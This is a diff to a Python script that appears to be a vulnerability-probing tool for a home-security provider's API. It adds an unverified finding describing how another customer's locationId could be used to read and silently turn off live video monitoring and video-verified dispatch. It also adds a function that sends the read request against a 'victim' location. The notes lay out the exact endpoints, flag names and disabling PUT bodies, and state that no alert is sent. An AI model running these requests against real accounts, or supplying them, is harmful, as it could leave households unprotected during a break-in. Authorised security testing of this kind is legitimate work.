@@ -235,6 +235,26 @@ FINDINGS = [
                   'obiwanA/obiwanB = internal codenames for unknown config — RE pending. '
                   'Test: GET /v1/ss3/subscriptions/{victim_sid}/settings/admin with own token; '
                   '200 = CRITICAL; then test POST with {admin:{monitoring:false}}.'),
+    Finding("F31", "CRITICAL", "Monitoring Feature Flag IDOR — Disable LiveGuard/VisualVerification on Victim",
+            "app_hub", "/monitoring/v1/locations/{locationId}/features/{feature}", "GET+PUT", None,
+            verified=False,
+            notes='APK: SsAppHubRestService.java (classes14.dex). '
+                  'GET monitoring/v2/locations/{locationId}/features -> List<MonitoringFeature>{name, enabled, options, consent, availability}. '
+                  'PUT monitoring/v1/locations/{locationId}/features/{feature} body: {"enabled": false}. '
+                  'Feature flag strings (MonitoringFeatureRequestObjectsKt): '
+                  '"LiveGuardProtection", "VisualVerification", "BetaProgramsInterestList", '
+                  '"InternalReviewRecordingAccess", "OperationalQualityAssuranceReviewEligible", '
+                  '"MachineLearningTrainingEligible". '
+                  'Undocumented Watchtower flags: "LiveGuardProtection-PreLaunchBeta-TermsAndConditions", '
+                  '"LiveGuardProtection-PreLaunchBeta-Program". '
+                  'If locationId not JWT-bound: '
+                  '(1) GET features -> read which premium monitoring features victim has enabled. '
+                  '(2) PUT LiveGuardProtection {enabled:false} -> disable live video monitoring — alarm triggers, no agent watches. '
+                  '(3) PUT VisualVerification {enabled:false} -> disable video-verified dispatch — response degraded to audio-only or no dispatch. '
+                  'Silent: no push notification for feature flag changes. '
+                  'F31 is distinct from F30 (admin.monitoring=false via SID): different identifier (locationId), different service layer, controls premium features not monitoring toggle. '
+                  'Test: GET monitoring/v2/locations/{victim_locationId}/features with own token; 200 = CRITICAL. '
+                  'Then PUT monitoring/v1/locations/{victim_locationId}/features/LiveGuardProtection body {"enabled":false}; 200/204 = CRITICAL write.'),
 ]
 
 
@@ -815,6 +835,27 @@ def test_face_idor(token, victim_sid, limit=5):
     if r:
         _print("CRIT" if r.status_code == 200 else "INFO", r.status_code,
                f"face/rated  {r.text[:150]}")
+
+
+def test_monitoring_feature_idor(token, victim_location_id):
+    """F31: Read/disable LiveGuard or VisualVerification features on victim location."""
+    print(f"\n=== F31 — Monitoring Feature Flag IDOR (victim_location_id={victim_location_id}) ===")
+    base = SERVICES["app_hub"]
+    r = get(f"{base}/monitoring/v2/locations/{victim_location_id}/features", token=token)
+    if not r:
+        print("  Request failed"); return
+    if r.status_code == 200:
+        try:
+            features = r.json()
+            flags = {f.get("name"): f.get("enabled") for f in (features if isinstance(features, list) else features.get("features", []))}
+            lgp = flags.get("LiveGuardProtection")
+            vv = flags.get("VisualVerification")
+            _print("CRIT", 200,
+                   f"FEATURES READ locationId={victim_location_id} LiveGuardProtection={lgp} VisualVerification={vv} all={flags}")
+        except Exception as e:
+            _print("CRIT", 200, f"200 OK (parse err: {e}) raw={r.text[:200]}")
+    else:
+        _print("INFO", r.status_code, f"features/{victim_location_id}: {r.text[:100]}")
 
 
 def test_webrtc_idor(token, victim_camera_uuid, victim_sid):
